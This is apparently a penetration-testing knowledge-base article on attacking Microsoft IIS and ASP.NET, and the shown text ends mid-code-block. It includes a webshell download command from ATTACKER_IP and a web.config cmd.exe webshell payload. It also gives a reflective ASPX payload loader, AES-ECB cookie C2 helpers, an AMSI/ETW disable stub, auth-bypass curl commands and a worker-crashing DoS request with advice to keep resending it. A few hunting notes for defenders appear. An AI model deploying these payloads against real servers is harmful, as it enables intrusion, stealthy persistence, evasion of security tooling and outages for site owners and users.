---
status: NEEDS_HUMAN_REVIEW
degradation_reason: |
  16 of 24 resources degraded (66.7%). Primary: Qwen+Tesseract unavailable (3 images).
  P0 link failures: soroush.secproject.com (JS-render, all tools exhausted),
  blog.orange.tw (blocked/JS, all tools exhausted). Both contain original
  research — content preserved from Hacktricks source but not independently verified.
  P2 wordlists (5) returned empty/redirect from raw.githubusercontent.com.
  P1 Unit42 Phantom Taurus article returned JS shell (Playwright not installed).
verified_resources: |
  P0: mindedsecurity (path traversal), tilde PDF (original research)
  P1: web.config PayloadsAllTheThings, IIS-ShortName-Scanner GitHub, Rapid7 trace.axd
  P2: brainstorm fuzzer (LLM shortname completion)
  P3: absolomb PE guide
  CrossRefs: av-bypass.md, telerik-ui-aspnet-ajax-unsafe-reflection-webresource-axd.md
  SectionMapping: 23/23 VERIFIED
---

attack_surface:
  - 配置缺陷
  - 认证/授权绕过
  - 信息泄露
impact:
  - 远程代码执行
  - 权限提升
  - 信息泄露
risk_level: 严重
prerequisites:
  - HTTP Protocol Basics
  - ASP.NET Pipeline & web.config
  - Windows Authentication (NTLM/Kerberos)
related_techniques:
  - file-upload
  - http-request-smuggling
  - waf-bypass
  - parameter-pollution
  - deserialization
difficulty: 高级
tools:
  - iis-shortname-scanner
  - aspnet-regiis
  - metasploit
  - dnspy
---

# IIS — Internet Information Services Attack Surface — IIS 攻击面分析

> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [HTTP Request Smuggling](../../Proxies/HTTP%20Request%20Smuggling/README.md) · [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [ViewState Deserialization](../User%20input/Structured%20objects/Deserialization/README.md)

---

# 0x01 IIS Attack Surface — Principles & Classification

## 1.1 IIS Architecture Overview

IIS (Internet Information Services) is Microsoft's extensible web server, deeply integrated with the Windows OS and .NET runtime. Its attack surface spans multiple layers:

- **HTTP.sys** — Kernel-mode HTTP listener, shared across all IIS app pools. Handles request parsing, SSL/TLS termination, response caching. Bugs here (e.g., HTTP.sys range header CVE-2015-1635) affect all sites on the server.
- **WAS (Windows Process Activation Service)** — Manages app pool lifecycle, worker process (w3wp.exe) activation, and identity assignment.
- **w3wp.exe** (IIS Worker Process) — Hosts the .NET CLR, loaded modules, and application code. The primary in-memory execution target.
- **ISAPI / Native Modules** — C/C++ filters and extensions (e.g., `asp.dll`, WebDAV, URL Rewrite). Historically a frequent source of parsing vulnerabilities (IIS 6.0 semicolon parsing, WebDAV PROPATCH overflows).
- **Managed Pipeline** — ASP.NET pipeline with HTTP modules and handlers. Extensible via `web.config` declarations; misconfigured handlers (e.g., Telerik `WebResource.axd`, `trace.axd`) expose unauthenticated attack surface.

Key executable file extensions recognized by IIS:

- `asp` — Classic ASP (Active Server Pages)
- `aspx` — ASP.NET Web Forms / MVC
- `config` — Web.config files (can be uploaded and abused for code execution)
- `php` — When PHP is installed via FastCGI

## 1.2 Attack Surface Taxonomy

IIS vulnerabilities are classified by root cause (C14), not payload form:

| Category | Taxonomy | Examples |
|----------|----------|----------|
| Configuration Weakness | 配置缺陷 | Writable webroot, trace.axd exposed, default keys, web.config abuse |
| Authentication/Authorization Bypass | 认证/授权绕过 | CVE-2022-30209 hash collision, Basic auth `:$i30:$INDEX_ALLOCATION`, ASPXAUTH cookie reuse |
| Information Disclosure | 信息泄露 | Tilde short filename, internal IP in Location header, path traversal → source code |
| Parsing Discrepancy | 协议解析差异 | IIS 6.0 semicolon parsing, WebDAV extension confusion |
| Injection | 注入类 | Telerik unsafe reflection (type-based constructor injection), SSRF via URL Rewrite |
| Cryptographic Misuse | 密码学误用 | ASP.NET machineKey default values, DPAPI key ring co-location |

## 1.3 Version Landscape

| Version | Windows Release | Key Attack Surface Changes |
|---------|-----------------|---------------------------|
| IIS 6.0 | Windows Server 2003 | ASP-only by default (no .NET integrated), WebDAV enabled, semicolon parsing bug, `asp/asa/cer/cdx` all interpreted as ASP |
| IIS 7.0 | Windows Server 2008 | Integrated pipeline (.NET + IIS unified), `web.config` handler registration, `trace.axd` |
| IIS 7.5 | Windows Server 2008 R2 | Basic auth `:$i30:$INDEX_ALLOCATION` bypass, FastCGI PHP `cgi.fix_pathinfo` parsing |
| IIS 8.0/8.5 | Windows Server 2012/2012 R2 | HTTPAPI 2.0, improved logging, centralized certificate management |
| IIS 10.0 | Windows Server 2016/2019/2022 | HTTP/2 support, IIS Express development server, ASP.NET Core hosting module |

### 知识路径

```
IIS Security (this document)
  ├── Prerequisite: HTTP Protocol — CRLF, request/response structure
  │   └── See: User input/Reflected Values/CRLF
  ├── Prerequisite: ASP.NET Fundamentals — pipeline, handlers, web.config
  ├── Next: Telerik UI WebResource.axd CVE-2025-3600 (deep dive)
  ├── Next: IIS Fileless Backdoors & NET-STAR Tradecraft Detection
  ├── Related: File Upload — IIS parsing bypasses
  │   └── See: Files/File Upload
  ├── Related: HTTP Request Smuggling with IIS backend
  │   └── See: Proxies/HTTP Request Smuggling
  ├── Related: WAF Bypass — IIS/ASP Classic filter evasion
  │   └── See: Proxies/Proxy & WAF Protections Bypass
  └── Related: Parameter Pollution — ASP.NET/IIS comma concatenation
      └── See: Other Helpful Vulnerabilities/Parameter Pollution
```

---

# 0x02 Reconnaissance & Fingerprinting

## 2.1 IIS Discovery Bruteforce

A merged wordlist (`iisfinal.txt`) combining six upstream lists for IIS directory/file enumeration:

- [SecLists IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)
- [ASP.NET Client Folder Enumeration](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)
- [DirBuster-NG iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)
- [SVNDigger aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)
- [SVNDigger asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)
- [wfuzz iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

> ⚠️ **Usage note**: Use the wordlist without appending any extension — paths that need extensions already have them included. The list contains both directory names and full file paths including legacy IIS administrative endpoints, FrontPage Server Extensions (`_vti_*`), and IISADMPWD password management paths.

Notable legacy paths with known vulnerabilities:

```
/iisadmpwd/achg.htr — Change password (IIS 4.0/5.0)
/iisadmpwd/aexp.htr — Expire password
/iisadmpwd/anot.htr — Notify password change
/iissamples/ — Default sample applications
/scripts/tools/newdsn.exe — DSN creation tool
/msadc/ — RDS/ADC (CVE-1999-1011)
/_vti_bin/shtml.dll — FrontPage Server Extensions
```

## 2.2 Tilde ~ Short Filename Disclosure

IIS supports the Windows 8.3 short filename convention. When a request contains the tilde character (`~`), IIS attempts to resolve it using the short filename. This leaks the first **6 characters** of file/folder names and the first **3 characters** of extensions — even behind authentication.

**Tooling:**

```bash
# Java-based scanner (original)
java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/

# Metasploit module
use scanner/http/iis_shortname_scanner
```

**LLM-Enhanced Reconstruction:** After discovering short filenames, use LLM-based fuzzing to guess the full filename:

```python
# From Invicti-Security/brainstorm
# Uses LLM to generate likely completions of abbreviated filenames
# https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py
```

**Limitations:**
- Only reveals first 6 chars of filename + first 3 chars of extension
- Dependent on 8.3 short name generation being enabled (enabled by default on system drive)
- May require repeated requests (the scanner uses 2 threads with configurable delay)

**Original Research:** [soroush.secproject.com — Microsoft IIS Tilde Character Vulnerability/Feature (PDF)](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

**Tool:** [github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

[图片: IIS ShortName scanner Java GUI output showing enumerated short filenames]

## 2.3 Internal IP Address Disclosure

On any IIS server returning a 302 redirect, stripping the `Host` header and using HTTP/1.0 can cause the server to disclose its internal IP in the `Location` header:

```shell
nc -v domain.com 80
openssl s_client -connect domain.com:443
```

Request:

```http
GET / HTTP/1.0

```

Response disclosing the internal IP:

```http
HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```

This technique is particularly effective against Exchange OWA deployments on IIS. For related Host header manipulation techniques, see [HTTP Request Smuggling](../../Proxies/HTTP%20Request%20Smuggling/README.md) and [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) which often leverage Host header control for backend confusion.

## 2.4 HTTPAPI 2.0 404 Fingerprinting

When `Host` header doesn't match any configured site binding, HTTPAPI 2.0 returns a distinctive 404 error page:

[图片: HTTPAPI 2.0 404 Not Found error page — indicates the server did not receive the correct domain name in the Host header]

> **Recovery**: Examine the served SSL Certificate for the correct domain/subdomain name. If not found, brute force VHosts until the correct `Host` header is identified.

## 2.5 ASP.NET Trace.AXD Debug Endpoint

ASP.NET includes a debugging mode accessible via `trace.axd` that logs detailed request information including:

- Remote client IP addresses
- Session IDs
- All request and response cookies
- Physical server paths
- Source code information
- **Potentially usernames and passwords in request parameters**

```http
GET /Trace.axd HTTP/1.1
Host: target.com
```

[图片: ASP.NET Trace.AXD detailed application trace log showing request history]

> **Note**: `trace.axd` requires the `<trace enabled="true" pageOutput="false" requestLimit="40" localOnly="false"/>` configuration in `web.config`. While `localOnly="true"` is the default, many deployments set it to `false` for remote debugging.

Reference: [Rapid7 — ASP.NET Trace.AXD Vulnerability](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

---

# 0x03 Configuration-Based Code Execution

## 3.1 Writable Webroot → ASPX Command Shell

### 3.1.1 Mechanism

If a low-privileged user or group has **write access to `C:\inetpub\wwwroot`**, an attacker can drop an ASPX webshell and execute OS commands as the application pool identity.

### 3.1.2 Verification

```powershell
# Check ACLs on the webroot
icacls C:\inetpub\wwwroot

# Legacy equivalent
cacls .
```

Look for `(F)` (Full Control) or `(W)` (Write) for your user or group.

### 3.1.3 Exploitation

```powershell
# Download and drop a command webshell
iwr http://ATTACKER_IP/shell.aspx -OutFile C:\inetpub\wwwroot\shell.aspx
```

Request `/shell.aspx` and execute commands. The identity typically shows `iis apppool\defaultapppool`.

### 3.1.4 Privilege Escalation Chain

The AppPool identity often holds **SeImpersonatePrivilege**. Combine with Potato-family LPE (GodPotato, SigmaPotato, JuicyPotato) to pivot from AppPool identity to `NT AUTHORITY\SYSTEM`. For the full privilege escalation methodology, see [Windows Local Privilege Escalation](~/Documents/hacktricks/src/windows-hardening/windows-local-privilege-escalation/README.md).

> **Limitation**: Requires separate write-access vulnerability (e.g., misconfigured NTFS permissions, FTP with write access to webroot, anonymous WebDAV upload).

## 3.2 Execute .config Files for Code Execution

### 3.2.1 Mechanism

IIS processes `.config` files (specifically `web.config`) as server-side configuration. This attack typically chains from a [File Upload](../../Files/File%20Upload/README.md) vulnerability — `.config` extensions are less commonly blocked than `.aspx` or `.php`. If an attacker can upload a `web.config` file to a web-accessible directory, they can:

1. Inject ASP.NET code within CDATA sections or HTML comments
2. Define new HTTP handlers pointing to malicious code
3. Override security constraints (e.g., disable request validation)

### 3.2.2 Example Payload

Appending code at the end of the file inside an HTML comment:

```xml
<!--
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    Response.Write(p.StandardOutput.ReadToEnd());
%>
-->
```

> **Reference payload:** [PayloadsAllTheThings — Configuration IIS web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

### 3.2.3 Conditions

- File upload endpoint must accept `.config` extension (not commonly blocked by upload filters focused on `.aspx`, `.asp`, `.php`)
- The uploaded `web.config` must be parsed by IIS (placed in a web-accessible directory)
- Application pool must have execution permissions

> **Deep dive:** [Soroush SecProject — Upload a Web.config File for Fun & Profit (2014)](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## 3.3 ASP.NET Path Traversal → Source Code Leak

### 3.3.1 Mechanism

In .NET MVC applications, the `web.config` file specifies every binary dependency via `<assemblyIdentity>` XML tags. By leveraging a path traversal vulnerability (e.g., in a file download endpoint), an attacker can:

1. Download `web.config` → enumerate assembly identities and namespaces
2. Download referenced DLLs from `/bin/` → reverse engineer for new namespace discovery
3. Pivot to namespace-specific `web.config` files → find additional assemblies
4. Repeat recursively until full source code is mapped

### 3.3.2 Attack Walkthrough

**Step 1: Download root web.config**

```http
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```

Response reveals:
- **EntityFramework** version
- **AppSettings** for webpages, client validation, JavaScript
- **System.web** configurations for authentication and runtime
- **System.webServer** module settings
- **Runtime** assembly bindings (`Microsoft.Owin`, `Newtonsoft.Json`, `System.Web.Mvc`, etc.)
- File paths like `/bin/WebGrease.dll`

**Step 2: Exfiltrate sensitive root files**

```
/global.asax — Application lifecycle handlers
/connectionstrings.config — Database passwords (plaintext if not encrypted)
```

**Step 3: Pivot to namespace-specific web.config**

```http
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```

**Step 4: Download compiled DLLs**

```http
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```

If a DLL imports a namespace such as `WebApplication1.Areas.Minded`, the attacker infers the existence of additional `web.config` at `/Minded/Views/web.config`, which may reference further DLLs like `WebApplication1.AdditionalFeatures.dll`.

### 3.3.3 Conditions & Limitations

- Requires an exploitable path traversal (e.g., `download_page?id=`) in the target application
- DLLs are compiled IL — requires .NET decompiler (dnSpy, ILSpy, dotPeek) to extract strings and logic
- `connectionstrings.config` may use ASP.NET Protected Configuration (requires §3.4 decryption)

> **Deep dive:** [MindedSecurity — From Path Traversal to Source Code in .NET (2018)](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

### 3.3.4 Common IIS/ASP.NET Sensitive Files

From [Absolomb Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/):

```
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\connectionstrings.config
C:\inetpub\wwwroot\global.asax
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config
```

## 3.4 Decrypt Encrypted Configuration & Data Protection Key Rings

### 3.4.1 ASP.NET Protected Configuration (Full Framework)

ASP.NET (Full Framework) uses `RsaProtectedConfigurationProvider` to encrypt `web.config` sections like `<connectionStrings>`. With filesystem or interactive access, the co-located key container allows decryption:

```cmd
# Decrypt by application path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Decrypt by physical path (-pef/-pdf)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```

### 3.4.2 ASP.NET Core Data Protection Key Rings

ASP.NET Core stores Data Protection key rings used for protecting application secrets and cookies. With the key ring available and running in the app's identity, an operator can instantiate an `IDataProtector` with the same purposes and unprotect stored secrets.

**Key ring locations:**

- `%PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys` (XML/JSON files)
- `HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys` (registry)
- App-managed folder (e.g., `App_Data\keys` or a `Keys` directory next to the app)

> **Warning:** Misconfigurations that store the key ring alongside the application files make offline decryption trivial once the host is compromised. The key ring should be stored in a separate, access-controlled location.

---

# 0x04 Authentication & Authorization Bypass

## 4.1 CVE-2022-30209 — Hash Table Cache Auth Bypass

### 4.1.1 Mechanism

A bug in IIS authentication code caused improper password verification: if an attacker-supplied password hash collides with a key already present in the authentication cache, the attacker is authenticated as the cached user without knowing the real password.

### 4.1.2 Hash Function Analysis

The vulnerability stems from a non-cryptographic hash function used for password cache lookups:

```python
def HashString(password):
    j = 0
    for c in map(ord, password):
        j = c + (101*j)&0xffffffff
    return j
```

**Collision example:**

```python
assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')
```

### 4.1.3 Exploitation

```bash
# Before successful login — 401 Unauthorized
curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | grep HTTP
HTTP/1.1 401 Unauthorized

# After legitimate user with colliding hash logs in, the attacker reuses the cached entry
curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | grep HTTP
HTTP/1.1 200 OK
```

### 4.1.4 Conditions

- Target must use IIS with Windows Authentication or Basic Authentication
- A legitimate user whose password's hash collides with the attacker's must have recently authenticated (cache entry exists)
- Cache TTL-dependent — window of opportunity is limited

> **Full analysis:** [Orange Tsai — Let’s Dance in the Cache: Destabilizing Hash Table on Microsoft IIS (2022)](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)

## 4.2 Basic Authentication Bypass (IIS 7.5)

### 4.2.1 Mechanism

IIS 7.5 Basic Authentication could be bypassed using NTFS alternate data stream syntax in the username field:

```
/admin:$i30:$INDEX_ALLOCATION/admin.php
/admin::$INDEX_ALLOCATION/admin.php
```

### 4.2.2 Combined Attack

Combine with tilde short filename enumeration (§2.2) to discover protected directories and filenames, then bypass authentication to access them.

> **Limitation:** This bypass is specific to IIS 7.5. Modern IIS versions (8.0+) are not affected.

## 4.3 ASPXAUTH Cookie Reuse via Default Keys

### 4.3.1 Mechanism

The ASPXAUTH cookie uses the following machineKey parameters:

- **`validationKey`** (string): Hex-encoded key for signature validation
- **`decryptionMethod`** (string): Default "AES"
- **`decryptionIV`** (string): Hex-encoded IV (defaults to zero vector)
- **`decryptionKey`** (string): Hex-encoded key for decryption

If a deployment uses **default values** and encodes the **user's email** as the identity in the cookie, an attacker can:

1. Find a separate web application using the same platform with default machineKey
2. Create an account on the second application with the target user's email
3. Extract the ASPXAUTH cookie from the second application
4. Replay the cookie against the target application to impersonate the user

> **Real-world case:** This technique was successfully used in a Facebook bug bounty writeup. [InfosecWriteups — How I Hacked Facebook Part Two](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)

### 4.3.2 Detection

Check `web.config` for `<machineKey>` element. If `validationKey` or `decryptionKey` are set to known default values (e.g., `AutoGenerate`, hardcoded hex strings from boilerplate templates), the application is vulnerable.

## 4.4 IIS 6.0 Parsing-Based Access Bypass

These parsing vulnerabilities are most commonly exploited through [File Upload](../../Files/File%20Upload/README.md) endpoints. The upload filter sees a benign extension while IIS interprets the file as executable ASP script. For bypass techniques against upload validation, also see [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md).

### 4.4.1 ASP/ASA Directory Parsing

On IIS 6.0, **any file** placed in a directory named with `.asp` or `.asa` extension (e.g., `/uploads.asp/`) is executed as ASP script — regardless of the file's actual extension.

### 4.4.2 Semicolon Extension Confusion (WebDAV)

When WebDAV is enabled on IIS 6.0, requesting `evil.asp;.jpg` causes IIS to interpret `;.jpg` as a parameter rather than the extension, executing `evil.asp` as ASP script. This bypasses upload filters that only check the final extension.

### 4.4.3 Default Executable Extensions

IIS 6.0 interprets these extensions as ASP script by default:

- `.asp` — Active Server Pages
- `.asa` — Global.asa (application-level ASP)
- `.cer` — Certificate file (mapped to ASP handler by default)
- `.cdx` — Compound Index (mapped to ASP handler by default)

> **Note:** The `.cer` and `.cdx` mappings are legacy defaults from IIS 4.0/5.0 era. Modern IIS versions removed these handler mappings.

### 4.4.4 IIS 7.5 FastCGI PHP Parsing

When PHP runs under FastCGI on IIS 7.5 with `cgi.fix_pathinfo=1` and the `Invoke handler only if request is mapped to` checkbox unchecked, appending `/.php` to any uploaded filename triggers PHP execution:

```
uploads/evil.jpg/.php → executes as PHP
```

---

# 0x05 Fileless Persistence & Advanced Tradecraft

## 5.1 NET-STAR / Phantom Taurus Architecture

The Phantom Taurus (APT) NET-STAR toolkit demonstrates mature fileless IIS persistence entirely inside `w3wp.exe`. The core ideas are broadly reusable for custom tradecraft and for detection/hunting.

**Key building blocks:**

1. **ASPX bootstrapper hosting embedded payload** — A single `.aspx` page carries a Base64-encoded, optionally Gzip-compressed .NET DLL. Trigger request decodes, decompresses, and reflectively loads it via `Assembly.Load(byte[])`.
2. **Cookie-scoped, encrypted C2** — Tasks and results wrapped: Gzip → AES-ECB/PKCS7 → Base64. Moved via cookie-heavy requests using stable delimiters (e.g., `"STAR"`).
3. **Reflective .NET execution** — Accept arbitrary managed assemblies as Base64, load via `Assembly.Load()`, invoke operator-specified entry points without touching disk.
4. **Precompiled site shell management** — Commands `bypassPrecompiledApp`, `addshell`, `listshell`, `removeshell` for managing backdoors in precompiled ASP.NET sites.
5. **Timestomping** — `changeLastModified` action for anti-forensics including future timestamps on deployed files.

## 5.2 ASPX Bootstrapper Loader Pattern

Minimal ASPX page that carries, decodes, and reflectively loads an embedded .NET payload:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
    // 1) Obtain payload bytes (hard-coded blob or from request)
    string b64 = /* hardcoded or Request["d"] */;
    byte[] blob = Convert.FromBase64String(b64);
    // optional: decrypt here if AES is used
    using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
        using(var ms = new MemoryStream()){
            gz.CopyTo(ms);
            var asm = Assembly.Load(ms.ToArray());
            // 2) Invoke the managed entry point (e.g., ServerRun.Run)
            var t = asm.GetType("ServerRun");
            var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
            object inst = m.IsStatic ? null : Activator.CreateInstance(t);
            m.Invoke(inst, new object[]{ HttpContext.Current });
        }
    }
}
</script>
```

## 5.3 Gzip + AES-ECB C2 Cookie Channel

Reference packing/unpacking helpers used for cookie-based C2:

```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
    using(var aes = Aes.Create()){
        aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
        ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
        return t.TransformFinalBlock(data, 0, data.Length);
    }
}

static string Pack(object obj, byte[] key){
    // serialize → gzip → AES-ECB → Base64
    byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
    using var ms = new MemoryStream();
    using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
    byte[] enc = AesEcb(ms.ToArray(), key, true);
    return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
    byte[] enc = Convert.FromBase64String(b64);
    byte[] cmp = AesEcb(enc, key, false);
    using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
    using var outMs = new MemoryStream(); gz.CopyTo(outMs);
    return Deserialize<T>(outMs.ToArray());
}
```

### 5.3.1 Command Surface

Commands observed in NET-STAR deployments:

- **File operations:** `fileExist`, `listDir`, `createDir`, `renameDir`, `fileRead`, `deleteFile`, `createFile`
- **Shell management:** `addshell`, `bypassPrecompiledApp`, `listShell`, `removeShell`
- **Database:** `executeSQLQuery`, `ExecuteNonQuery`
- **Code execution:** `code_self`, `code_pid`, `run_code` (in-memory .NET execution)
- **Anti-forensics:** `changeLastModified`

## 5.4 Timestomping & Anti-Forensics

```csharp
File.SetCreationTime(path, ts); 
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```

Operators deployed ASPX files with future timestamps to evade timeline-based DFIR.

## 5.5 AMSI/ETW Disable for In-Memory Payloads

Before reflectively loading operator assemblies, the loader can patch AMSI and ETW to reduce inspection of in-memory payloads:

```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```

> **Background:** See [AMSI/ETW bypass techniques](~/Documents/hacktricks/src/windows-hardening/av-bypass.md) for the full methodology.

### 5.5.1 Hunting Notes (Defenders)

- Single, odd ASPX page with very long Base64/Gzip blobs; cookie-heavy POSTs
- Unbacked managed modules inside `w3wp.exe`; strings like `Encrypt/Decrypt` (ECB), `Compress/Decompress`, `GetContext`, `Run`
- Repeated delimiters like `"STAR"` in traffic
- Mismatched or future timestamps on ASPX/assemblies
- `Assembly.Load(byte[])` calls from unusual call stacks (not typical app startup)

---

# 0x06 Third-Party Component Attacks

## 6.1 Telerik UI WebResource.axd CVE-2025-3600 — Unsafe Reflection

### 6.1.1 Overview

Many ASP.NET applications embed **Telerik UI for ASP.NET AJAX** and expose the unauthenticated handler `Telerik.Web.UI.WebResource.axd`. When the Image Editor cache endpoint is reachable (`type=iec`), the parameters `dkey=1` and `prtype` enable **unsafe reflection** that executes any public parameterless constructor — **pre-authentication**. This is a distinct attack from Telerik's older [ViewState deserialization](../../../User%20input/Structured%20objects/Deserialization/README.md) CVE-2019-18935 (RAU handler `type=rau`), though both live in the same `Telerik.Web.UI.dll` assembly.

### 6.1.2 Affected Versions

- Telerik UI for ASP.NET AJAX versions **2011.2.712 through 2025.1.218** (inclusive) are vulnerable
- Fixed in **2025.1.416** (released 2025-04-29)

### 6.1.3 Detection

```bash
# Check handler exposure
curl -skI https://target/Telerik.Web.UI.WebResource.axd

# Probe the vulnerable endpoint
curl -sk 'https://target/Telerik.Web.UI.WebResource.axd?type=iec'
```

Do not rely on finding "Telerik" strings on `/` or login pages — products such as Sitecore often expose the handler without referencing it in default HTML.

Handler registration signatures to search for:

```xml
<!-- system.web -->
<add path="Telerik.Web.UI.WebResource.axd" type="Telerik.Web.UI.WebResource" verb="*" validate="false" />

<!-- system.webServer -->
<add name="Telerik_Web_UI_WebResource_axd" path="Telerik.Web.UI.WebResource.axd" type="Telerik.Web.UI.WebResource" verb="*" preCondition="integratedMode" />
```

### 6.1.4 Root Cause

The Image Editor cache download flow constructs an instance of a type supplied in `prtype` and only later casts it to `ICacheImageProvider` and validates the download key — **the constructor already ran when validation fails**.

```csharp
// entrypoint
public void ProcessRequest(HttpContext context)
{
    string text = context.Request["dkey"];           // dkey
    string text2 = context.Request.Form["encryptedDownloadKey"]; // download key
    ...
    if (this.IsDownloadedFromImageProvider(text)) // effectively dkey == "1"
    {
        ICacheImageProvider imageProvider = this.GetImageProvider(context); // instantiation happens here
        string key = context.Request["key"];
        if (text == "1" && !this.IsValidDownloadKey(text2))
        {
            this.CompleteAsBadRequest(context.ApplicationInstance);
            return; // cast/check happens AFTER ctor has already run
        }
        ...
    }
}

private ICacheImageProvider GetImageProvider(HttpContext context)
{
    if (!string.IsNullOrEmpty(context.Request["prtype"]))
    {
        return RadImageEditor.InitCacheImageProvider(
            RadImageEditor.GetICacheImageProviderType(context.Request["prtype"]) // [A]
        );
    }
    ...
}

public static Type GetICacheImageProviderType(string imageProviderTypeName)
{
    return Type.GetType(string.IsNullOrEmpty(imageProviderTypeName) ?
        typeof(CacheImageProvider).FullName : imageProviderTypeName); // [B]
}

protected internal static ICacheImageProvider InitCacheImageProvider(Type t)
{
    // unsafe: construct before enforcing interface type-safety
    return (ICacheImageProvider)Activator.CreateInstance(t); // [C]
}
```

**Exploit primitive:** Controlled type string → `Type.GetType()` resolves it → `Activator.CreateInstance()` runs its public parameterless constructor. Even if rejected afterwards, **gadget side-effects already occurred**.

### 6.1.5 Universal DoS Gadget

```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```

Class `System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper` in `System.Management.Automation` (PowerShell) has a finalizer that disposes an uninitialized handle, causing an unhandled exception when GC finalizes — reliably **crashing the IIS worker process (w3wp.exe)**.

> Keep sending periodically to keep the site offline.

### 6.1.6 RCE Escalation Patterns

1. **Parameterless constructors processing attacker input** — Some ctors read request body/query/cookies/headers and deserialize (e.g., Sitecore `GetLayoutDefinition()` reads HTTP body `layout`, deserializes JSON via JSON.NET).
2. **Constructors touching files** — Ctors that load config/blobs from disk abuse if attacker can write to those paths.
3. **AppDomain.AssemblyResolve abuse** — Register insecure resolver → request nonexistent type → resolver builds DLL path from `args.Name` without sanitization → load attacker-controlled DLL.

**Example pre-auth RCE chain (Sitecore XP):**

1. Pre-auth: Trigger a type whose ctor registers an insecure `AssemblyResolve` handler
2. Post-auth or via separate vuln: Write malicious DLL into resolver-probed directory
3. Pre-auth: Use CVE-2025-3600 with non-existent type + traversal-laden assembly name → resolver loads planted DLL → code execution as IIS worker

```http
# Load the insecure resolver (no auth on many setups)
GET /-/xaml/Sitecore.Shell.Xaml.WebControl

# Coerce the resolver via Telerik unsafe reflection
